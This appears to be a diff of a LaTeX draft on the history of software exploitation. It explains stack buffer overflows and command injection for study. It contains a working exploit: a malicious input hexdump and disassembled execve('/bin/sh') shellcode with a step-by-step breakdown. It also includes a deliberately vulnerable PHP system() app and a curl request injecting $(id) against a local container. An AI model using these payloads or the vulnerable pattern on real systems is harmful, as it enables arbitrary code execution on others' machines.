### 2023-06-20 paper.tex
loleo

\lstset{
    language=C,
    basicstyle=\ttfamily\small,
    keywordstyle=\color{blue}\ttfamily,
    stringstyle=\color{red}\ttfamily,
    commentstyle=\color{green}\ttfamily,
    morecomment=[l][\color{magenta}]{\#},
    breaklines=true
}

@@

\subsection{Early stage}
\begin{comment}
  shellcoding
  reference smashing the stack for fun and profit
\end{comment}
One of the earliest vulnerability that was exploited was the venerable bufffer
overflow. A Buffer overflow represents a crucial class of software
vulnerabilities that can serve as a launching pad for a myriad of complex
exploits, one of which includes shellcode injection. This vulnerability arises
when more data is written to a buffer than it can hold, thereby allowing an
attacker to overwrite adjacent memory locations \cite{seacord2013}. If exploited
judiciously, this can lead to the alteration of program's control flow, enabling
an attacker to execute arbitrary code. One manifestation of this is shellcoding,
where an attacker injects a sequence of bytes, often encoding command-line shell
instructions, into the memory and manipulates the program's execution flow to
execute this code \cite{one1996smashing}. This capability to execute arbitrary
code gives the attacker full control over the compromised system, thereby
illustrating the severity and implications of buffer overflow vulnerabilities.

@@

\begin{lstlisting}[caption={Hexdump of malicious input}
      ,label={lst:bof_malicous_hex}
      ,language=bash]
0000000 0000 0000 0000 0000 0000 0000 0000 0000
*
0000100 0000 0000 0000 0000 115a 0040 0000 0000
0000110 9090 9090 9090 9090 9090 9090 9090 9090
*
0000310 8148 80ec 0000 6a00 4868 2fb8 6962 2f6e
0000320 2f2f 5073 8948 68e7 6972 0101 3481 0124
0000330 0101 3101 56f6 086a 485e e601 4856 e689
0000340 d231 3b6a 0f58 0005
0000347
\end{lstlisting}
Our simple program seems to be behaving like a system shell. We will now analyse
what happened during the execution of our program. Here~\ref{lst:bof_malicous_hex}
is a hexdump of the input. Let's break it down:

@@

\subsection{Evolution}
\begin{comment}
  ret2libc
  Mention the lack of mitigation
  Rise of heap based exploits due to browsers and JS
  Research some linux&windows kernel exploits
\end{comment}
\subsection{State of the art}
\begin{comment}
  Rise of the hypervizor exploits (showcase some virtualbox exploits, maybe
  vmware hyperv) RCE Exploits mostly slowing down Common techniques no longer
  being effective (check offbyonesec talk about windows kernel exploitation, talk
  about)
\end{comment}

>>>>

\lstset{
    basicstyle=\ttfamily\small,
    keywordstyle=\color{blue}\ttfamily,
    stringstyle=\color{red}\ttfamily,
    commentstyle=\color{gray}\ttfamily,
    morecomment=[l][\color{magenta}]{\#},
    breaklines=true
}

@@

\subsection{Early stage}
\subsubsection{Shellcoding}
\begin{comment}
  shellcoding
  reference smashing the stack for fun and profit
\end{comment}
One of the earliest vulnerability that was exploited was the venerable bufffer
overflow. A Buffer overflow represents a crucial class of software
vulnerabilities that can serve as a launching pad for a myriad of complex
exploits, one of which includes shellcode injection. This vulnerability arises
when more data is written to a buffer than it can hold, thereby allowing an
attacker to overwrite adjacent memory locations \cite{seacord2013}. If exploited
judiciously, this can lead to the alteration of program's control flow, enabling
an attacker to execute arbitrary code. One manifestation of this is shellcoding,
where an attacker injects a sequence of bytes, often encoding command-line shell
instructions, into the memory and manipulates the program's execution flow to
execute this code \cite{one1996smashing}. This capability to execute arbitrary
code gives the attacker full control over the compromised system, thereby
illustrating the severity and implications of buffer overflow vulnerabilities.

@@

\begin{lstlisting}[caption={Hexdump of malicious input}
      ,label={lst:bof_malicous_hex}
      ,language=bash]
0000000 0000 0000 0000 0000 0000 0000 0000 0000
*
0000100 0000 0000 0000 0000 115a 0040 0000 0000
0000110 9090 9090 9090 9090 9090 9090 9090 9090
*
0000310 8148 80ec 0000 6a00 4868 2fb8 6962 2f6e
0000320 2f2f 5073 8948 68e7 6972 0101 3481 0124
0000330 0101 3101 56f6 086a 485e e601 4856 e689
0000340 d231 3b6a 0f58 0005
0000347
\end{lstlisting}
Our simple program seems to be behaving like a system shell. We will now analyse
what happened during the execution of our program. Here~\ref{lst:bof_malicous_hex}
is a hexdump of the input. Let's break it down:
\begin{enumerate}
  \item The first 0x100 bytes of the payload are just null bytes\footnote{We are
  allowed to do this because \emph{gets} does not stop reading the string when it
  encounters a \emph{NULL} (0) byte, even though strings in C are almost always
  NULL terminated.~\emph{scanf} will only return when it encounters an error or
  reads a line ending}. We do this in order to fill up the buffer that the
  application uses. These values could realistically be anything (besides line
  endings).
  \item As shown in\ref{veziacistackuala} we now need to overflow the
  \emph{base pointer}. In this exploitation scenario this can also be any value,
  but it can allow us to pivot the stack into some memory address we know in some cases.
  \item Now we overwrite the \emph{return address} to point to the address of the \emph{jump rsp} instruction.
  \item After the return address we place a \emph{nop sled}. The purpose of the nop
  sled is to allow us some leeway\footnote{When jumping into shellcode written to the stack the addresses the stack register and instruction pointer point to are close together. Stack manipulations (such as \emph{push}es and \emph{pop}s) can overwrite the shellcode, causing it to misbehave or making the processor execute illegal instructions.} when crafting the actual malicious payload.
  \item Finally we place the instructions we want to execute. The payload exemplified\ref{vezipayload} here uses the \emph{execve} syscall to replace the current running
  process with the \emph{sh} shell process.
\end{enumerate}

This traditional exploitation technique of buffer overflow into shellcode has
been effectively mitigated by a plethora of defensive mechanisms that we will
discuss in subsequent chapters, such as Address Space Layout Randomization
(ASLR), Data Execution Prevention (DEP), Stack Canaries, and Control-Flow
Integrity (CFI). Despite these advancements, the described exploitation
scenarios retain relevance in contexts where these protection measures are
absent or cannot be implemented. For example, systems lacking a Memory
Management Unit (MMU), many embedded systems, and certain router configurations
may not have these defenses, leaving them susceptible to such attacks. Thus,
understanding these exploits remains critical in a comprehensive approach to
system security.

@@

\begin{lstlisting}[caption={Shellcode disassembly}
      ,label={lst:bof}
      ,language={[x86masm]Assembler}]
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push b'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
\end{lstlisting}

\subsubsection{Command injection}
Command injection vulnerabilities represent a pervasive class of security issues
that impact both web and system programming environments. These vulnerabilities
occur when an application passes unsafe user-supplied data (forms, cookies, HTTP
headers, etc.) to a system shell, allowing the attacker to execute arbitrary
commands on the host operating system. In the context of web applications, these
flaws are primarily found in scripts that fail to properly sanitize user input,
making them susceptible to cross-site scripting (XSS) and SQL injection attacks.
However, command injection vulnerabilities are not confined to web programming;
they are equally prevalent in systems programming. Poorly designed system
applications and scripts that accept untrusted input for command execution can
expose the system to similar attacks. This vulnerability, thus, underlines the
importance of careful data handling and proper input validation, irrespective of
the programming environment.

We will be walking through the following\ref{veziphpbapula} vulnerable PHP app.
The application lacks proper input validation and allows an attacker to execute
arbitrary commands. The use of the \emph{system} function will cause the following
process to execute \texttt{sh -c ``echo Hello <username>''}. Our\ref{poggeroni}
malicious request sets the \emph{username} parameter to \verb|$(id)|. Because
the original command executes in a shell environment, the shell will interpret
this string by forking itself and executing the string in between the braces and
replacing the original string with the result of the command. We can imagine that
we can cause havoc on the vulnerable machine by being able to execute any command
we want.

\begin{minipage}{\linewidth}
\begin{lstlisting}[caption={Command Injection example}
      ,label={lst:bof}
      ,language=PHP]
<?php
    $username = $_GET['username'];
    system("echo Hello " . $username);
?>
\end{lstlisting}
\end{minipage}

\begin{lstlisting}[caption={Command Injection example}
      ,label={lst:bof}
      ,language=bash]
$ docker run -d -p 8080:80 command_injection_php
d58498277e1194cc46dac4009f8fca1c84ce02bea21008075ad53f77bd63202f
$ curl http://127.0.0.1:8080/hello\?username\=$\(id\)
Hello uid=33(www-data) gid=33(www-data) groups=33(www-data)
\end{lstlisting}

Command injection vulnerabilities can drastically undermine security measures. They enable attackers to bypass reverse proxies, offering unauthorized access to protected internal services. Moreover, such vulnerabilities can assist in creating botnets by allowing threat actors to inject commands to download and install malicious software, leading to potential large-scale cyber threats such as Distributed Denial of Service (DDoS) attacks.

The situation is similar in the systems programming space. The example for how 
a vulnerable program might look is left as an exercise to the reader.
\subsection{Evolution}
\begin{comment}
  ret2libc
  Mention the lack of mitigation
  Rise of heap based exploits due to browsers and JS
  Research some linux&windows kernel exploits
\end{comment}
\subsection{State of the art}
\begin{comment}
  Rise of the hypervizor exploits (showcase some virtualbox exploits, maybe
  vmware hyperv) RCE Exploits mostly slowing down Common techniques no longer
  being effective (check offbyonesec talk about windows kernel exploitation, talk
  about)
\end{comment}
